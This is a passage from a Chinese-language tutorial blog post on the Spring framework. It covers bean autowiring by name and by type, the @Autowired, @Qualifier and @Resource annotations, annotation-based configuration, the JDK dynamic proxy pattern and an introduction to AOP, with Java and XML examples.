<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qinjiang&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、再次测试，结果依旧成功输出！</p>
<p>3、我们将 cat 的bean id修改为 catXXX</p>
<p>4、再次测试， 执行时报空指针java.lang.NullPointerException。因为按byName规则找不对应set方法，真正的setCat就没执行，对象就没有初始化，所以调用时就会报空指针错误。</p>
<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>当一个bean节点带有 autowire byName的属性时。</p>
<ol>
<li><p>将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat。</p>
</li>
<li><p>去spring容器中寻找是否有此字符串名称id的对象。</p>
</li>
<li><p>如果有，就取出注入；如果没有，就报空指针异常。</p>
</li>
</ol>
<h2 id="byType"><a href="#byType" class="headerlink" title="byType"></a>byType</h2><p><strong>autowire byType (按类型自动装配)</strong></p>
<p>使用autowire byType首先需要保证：同一类型的对象，在spring容器中唯一。如果不唯一，会报不唯一的异常。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NoUniqueBeanDefinitionException</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>1、将user的bean配置修改一下 ： autowire&#x3D;”byType”</p>
<p>2、测试，正常输出</p>
<p>3、在注册一个cat 的bean对象！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qinjiang&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>4、测试，报错：NoUniqueBeanDefinitionException</p>
<p>5、删掉cat2，将cat的bean名称改掉！测试！因为是按类型装配，所以并不会报异常，也不影响最后的结果。甚至将id属性去掉，也不影响结果。</p>
<p>这就是按照类型自动装配！</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这是去spring容器中寻找是否有此类型的对象存在</p>
<p>有且只有一个就可以注入在这里，但是有多个Spring不知道到底赋值哪个，需要进行配置</p>
<h1 id="使用注解"><a href="#使用注解" class="headerlink" title="使用注解"></a>使用注解</h1><blockquote>
<p>使用注解</p>
</blockquote>
<p>jdk1.5开始支持注解，spring2.5开始全面支持注解。</p>
<p>准备工作：利用注解的方式注入属性。</p>
<p>1、在spring配置文件中引入context文件头</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/context</span><br><span class="line">http://www.springframework.org/schema/context/spring-context.xsd</span><br></pre></td></tr></table></figure>

<p>2、开启属性注解支持！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h2><ul>
<li>@Autowired是按类型自动转配的，不支持id匹配。</li>
<li>需要导入 spring-aop的包！</li>
</ul>
<p>测试：</p>
<p>1、将User类中的set方法去掉，使用@Autowired注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="keyword">private</span> Cat cat;</span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="keyword">private</span> Dog dog;</span><br><span class="line">   <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Cat <span class="title function_">getCat</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> cat;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">public</span> Dog <span class="title function_">getDog</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> dog;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getStr</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> str;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、此时配置文件内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、测试，成功输出结果！</p>
<p>【小狂神科普时间】</p>
<p>@Autowired(required&#x3D;false)  说明：false，对象可以为null；true，对象必须存对象，不能为null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果允许对象为null，设置required = false,默认为true</span></span><br><span class="line"><span class="meta">@Autowired(required = false)</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br></pre></td></tr></table></figure>

<h2 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h2><ul>
<li>@Autowired是根据类型自动装配的，加上@Qualifier则可以根据byName的方式自动装配</li>
<li>@Qualifier不能单独使用。</li>
</ul>
<p>测试实验步骤：</p>
<p>1、配置文件修改内容，保证类型存在对象。且名字不为类的默认名字！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、没有加Qualifier测试，直接报错 因为有多个同类型的实例在容器中</p>
<p>3、在属性上添加Qualifier注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(value = &quot;cat2&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier(value = &quot;dog2&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure>

<p>测试，成功输出！</p>
<h2 id="Resource"><a href="#Resource" class="headerlink" title="@Resource"></a>@Resource</h2><ul>
<li>@Resource如有指定的name属性，先按该属性进行byName方式查找装配；</li>
<li>其次再进行默认的byName方式进行装配；</li>
<li>如果以上都不成功，则按byType的方式自动装配。</li>
<li>都不成功，则报异常。</li>
</ul>
<p>实体类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="comment">//如果允许对象为null，设置required = false,默认为true</span></span><br><span class="line">   <span class="meta">@Resource(name = &quot;cat2&quot;)</span></span><br><span class="line">   <span class="keyword">private</span> Cat cat;</span><br><span class="line">   <span class="meta">@Resource</span></span><br><span class="line">   <span class="keyword">private</span> Dog dog;</span><br><span class="line">   <span class="keyword">private</span> String str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>beans.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试：结果OK</p>
<p>配置文件2：beans.xml ， 删掉cat2</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>实体类上只保留注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> Cat cat;</span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure>

<p>结果：OK</p>
<p>结论：先进行byName查找，失败；再进行byType查找，成功。</p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>@Autowired与@Resource异同：</p>
<p>1、@Autowired与@Resource都可以用来装配bean。都可以写在字段上，或写在setter方法上。</p>
<p>2、@Autowired默认按类型装配（属于spring规范），默认情况下必须要求依赖对象必须存在，如果要允许null 值，可以设置它的required属性为false，如：@Autowired(required&#x3D;false) ，如果我们想使用名称装配可以结合@Qualifier注解进行使用</p>
<p>3、@Resource（属于J2EE复返），默认按照名称进行装配，名称可以通过name属性进行指定。如果没有指定name属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在setter方法上默认取属性名进行装配。当找不到与名称匹配的bean时才按照类型进行装配。但是需要注意的是，如果name属性一旦指定，就只会按照名称进行装配。</p>
<p>它们的作用相同都是用注解方式注入对象，但执行顺序不同。@Autowired先byType，@Resource先byName。</p>
<h1 id="使用注解开发"><a href="#使用注解开发" class="headerlink" title="使用注解开发"></a>使用注解开发</h1><p>在spring4之后，想要使用注解形式，必须得要引入aop的包</p>
<p>在配置文件当中，还得要引入一个context约束</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Bean的实现"><a href="#Bean的实现" class="headerlink" title="Bean的实现"></a>Bean的实现</h2><p>我们之前都是使用 bean 的标签进行bean注入，但是实际开发中，我们一般都会使用注解！</p>
<p>1、配置扫描哪些包下的注解</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--指定注解扫描包--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.kuang.pojo&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、在指定包下编写类，增加注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;user&quot;)</span></span><br><span class="line"><span class="comment">// 相当于配置文件中 &lt;bean id=&quot;user&quot; class=&quot;当前注解的类&quot;/&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;秦疆&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span></span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">   <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) applicationContext.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   System.out.println(user.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="属性注入"><a href="#属性注入" class="headerlink" title="属性注入"></a>属性注入</h2><p>使用注解注入属性</p>
<p>1、可以不用提供set方法，直接在直接名上添加@value(“值”)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;user&quot;)</span></span><br><span class="line"><span class="comment">// 相当于配置文件中 &lt;bean id=&quot;user&quot; class=&quot;当前注解的类&quot;/&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="meta">@Value(&quot;秦疆&quot;)</span></span><br><span class="line">   <span class="comment">// 相当于配置文件中 &lt;property name=&quot;name&quot; value=&quot;秦疆&quot;/&gt;</span></span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、如果提供了set方法，在set方法上添加@value(“值”);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Value(&quot;秦疆&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="衍生注解"><a href="#衍生注解" class="headerlink" title="衍生注解"></a>衍生注解</h2><p>我们这些注解，就是替代了在配置文件当中配置步骤而已！更加的方便快捷！</p>
<h3 id="Component三个衍生注解"><a href="#Component三个衍生注解" class="headerlink" title="@Component三个衍生注解"></a><strong>@Component三个衍生注解</strong></h3><p>为了更好的进行分层，Spring可以使用其它三个注解，功能一样，目前使用哪一个功能都一样。</p>
<ul>
<li>@Controller：web层</li>
<li>@Service：service层</li>
<li>@Repository：dao层</li>
</ul>
<p>写上这些注解，就相当于将这个类交给Spring管理装配了！</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>@scope</p>
<ul>
<li>singleton：默认的，Spring会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。</li>
<li>prototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller(&quot;user&quot;)</span></span><br><span class="line"><span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="meta">@Value(&quot;秦疆&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p><strong>XML与注解比较</strong></p>
<ul>
<li>XML可以适用任何场景 ，结构清晰，维护方便</li>
<li>注解不是自己提供的类使用不了，开发简单方便</li>
</ul>
<p><strong>xml与注解整合开发</strong> ：推荐最佳实践</p>
<ul>
<li>xml管理Bean</li>
<li>注解完成属性注入</li>
<li>使用过程中， 可以不用扫描，扫描是为了类上的注解</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;context:annotation-config/&gt;  </span><br></pre></td></tr></table></figure>

<p>作用：</p>
<ul>
<li>进行注解驱动注册，从而使注解生效</li>
<li>用于激活那些已经在spring容器里注册过的bean上面的注解，也就是显示的向Spring注册</li>
<li>如果不扫描包，就需要手动配置bean</li>
<li>如果不加注解驱动，则注入的值为null！</li>
</ul>
<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>代理模式：</p>
<ul>
<li>静态代理</li>
<li>动态代理</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/28/iljBFqJcRb5drDa.jpg"
                      alt="Screenshot_8.jpg"
                ></p>
<p>在这个过程中，你直接接触的就是中介，就如同现实生活中的样子，你看不到房东，但是你依旧租到了房东的房子通过代理，这就是所谓的代理模式，程序源自于生活，所以学编程的人，一般能够更加抽象的看待生活中发生的事情。</p>
<p><strong>静态代理的好处:</strong></p>
<ul>
<li>可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</li>
<li>公共的业务由代理来完成 . 实现了业务的分工 ,</li>
<li>公共业务发生扩展时变得更加集中和方便 .</li>
</ul>
<p>缺点 :</p>
<ul>
<li>类多了 , 多了代理类 , 工作量变大了 . 开发效率降低 .</li>
</ul>
<p>我们想要静态代理的好处，又不想要静态代理的缺点，所以 , 就有了动态代理 !</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul>
<li><p>动态代理的角色和静态代理的一样 .</p>
</li>
<li><p>动态代理的代理类是动态生成的 . 静态代理的代理类是我们提前写好的</p>
</li>
<li><p>动态代理分为两类 : 一类是基于接口动态代理 , 一类是基于类的动态代理</p>
</li>
<li><ul>
<li>基于接口的动态代理—-JDK动态代理</li>
<li>基于类的动态代理–cglib</li>
<li>现在用的比较多的是 javasist 来生成动态代理 . 百度一下javasist</li>
<li>我们这里使用JDK的原生代码来实现，其余的道理都是一样的！、</li>
</ul>
</li>
</ul>
<p><strong>JDK的动态代理需要了解两个类</strong></p>
<p>核心 : InvocationHandler   和   Proxy </p>
<p><strong>代码实现</strong> </p>
<p>抽象角色和真实角色和之前的一样！</p>
<p>Rent . java 即抽象角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象角色：租房</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Host . java 即真实角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//真实角色: 房东，房东要出租房子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;房屋出租&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ProxyInvocationHandler. java 即代理角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Rent rent;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRent</span><span class="params">(Rent rent)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.rent = rent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//生成代理类，重点是第二个参数，获取要代理的抽象角色！之前都是一个角色，现在可以代理一类角色</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(),</span><br><span class="line">               rent.getClass().getInterfaces(),<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// proxy : 代理类 method : 代理类的调用处理程序的方法对象.</span></span><br><span class="line">   <span class="comment">// 处理代理实例上的方法调用并返回结果</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> throwsThrowable &#123;</span><br><span class="line">       seeHouse();</span><br><span class="line">       <span class="comment">//核心：本质利用反射实现！</span></span><br><span class="line">       <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(rent, args);</span><br><span class="line">       fare();</span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//看房</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;带房客看房&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">//收中介费</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fare</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;收中介费&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client . java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//租客</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//真实角色</span></span><br><span class="line">       <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">       <span class="comment">//代理实例的调用处理程序</span></span><br><span class="line">       <span class="type">ProxyInvocationHandler</span> <span class="variable">pih</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyInvocationHandler</span>();</span><br><span class="line">       pih.setRent(host); <span class="comment">//将真实角色放置进去！!!!!!!!!!!!!!</span></span><br><span class="line">       <span class="type">Rent</span> <span class="variable">proxy</span> <span class="operator">=</span> (Rent)pih.getProxy(); <span class="comment">//动态生成对应的代理类！</span></span><br><span class="line">       proxy.rent();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意在测试代码中，是把真实角色交给代理类，生成对应的代理类实例</p>
<p>核心：<strong>一个动态代理 , 一般代理某一类业务 , 一个动态代理可以代理多个类，代理的是接口！、</strong></p>
<h1 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h1><p>AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。</p>
<p>AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。</p>
<h2 id="Aop在Spring中的作用"><a href="#Aop在Spring中的作用" class="headerlink" title="Aop在Spring中的作用"></a>Aop在Spring中的作用</h2><p>提供声明式事务；允许用户自定义切面</p>
<p>以下名词需要了解下：</p>
<ul>
<li>横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 ….</li>
<li>切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。</li>
<li>通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。</li>
<li>目标（Target）：被通知对象。</li>
<li>代理（Proxy）：向目标对象应用通知之后创建的对象。</li>
<li>切入点（PointCut）：切面通知 执行的 “地点”的定义。</li>
<li>连接点（JointPoint）：与切入点匹配的执行点。</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/28/oSBxHJ8lNhUuTMF.jpg"
                      alt="Screenshot_9.jpg"
                ></p>
<p>SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice</p>
<p>可以通过这些使得在不改变原有代码的情况下增加新的功能</p>
<h2 id="使用Spring实现Aop"><a href="#使用Spring实现Aop" class="headerlink" title="使用Spring实现Aop"></a>使用Spring实现Aop</h2><p>【重点】使用AOP织入，需要导入一个依赖包！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a><strong>第一种方式</strong></h3><p><strong>通过 Spring API 实现</strong></p>
<p>首先编写我们的业务接口和实现类</p>
